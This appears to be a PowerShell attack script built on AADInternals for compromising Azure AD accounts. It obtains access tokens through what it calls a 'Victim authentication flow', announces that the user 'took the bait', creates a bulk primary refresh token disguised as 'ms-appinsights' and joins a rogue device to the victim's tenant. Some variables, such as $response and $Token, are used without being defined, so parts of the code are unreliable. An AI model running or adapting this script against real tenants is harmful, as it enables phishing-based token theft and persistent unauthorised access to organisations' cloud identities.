[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureHound,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$recon,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureAd,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent, 
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject

)

$modules = .\Scripts\Import.ps1

# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Get-AADIntAccessTokenForAADGraph -Resource urn:ms-drs:enterpriseregistration.windows.net -SaveToCache
    #Invoke-ClearToken -Token All
   # Write-Output "Clearing any previous tokens for a clean run."
    #Get-AzureToken -Client Graph    
} else {
    Get-AADIntAccessTokenForAADGraph -Resource urn:ms-drs:enterpriseregistration.windows.net -SaveToCache
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    # Get-AzureToken -Client Graph -CaptureCode $Token
}


Write-Output "Victim authentication flow"

$access = $response.access_token
$refresh = $response.refresh_token

Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

# Target details constructed from token   
$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."


# Get the access token
# Get-AADIntAccessTokenForAADGraph -Resource urn:ms-drs:enterpriseregistration.windows.net -SaveToCache

# Create a new BPRT
$bprt = New-AADIntBulkPRTToken -Name "ms-appinsights"

Get-AADIntAccessTokenForAADJoin -BPRT $BPRT -SaveToCache

# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "desktop-8675309"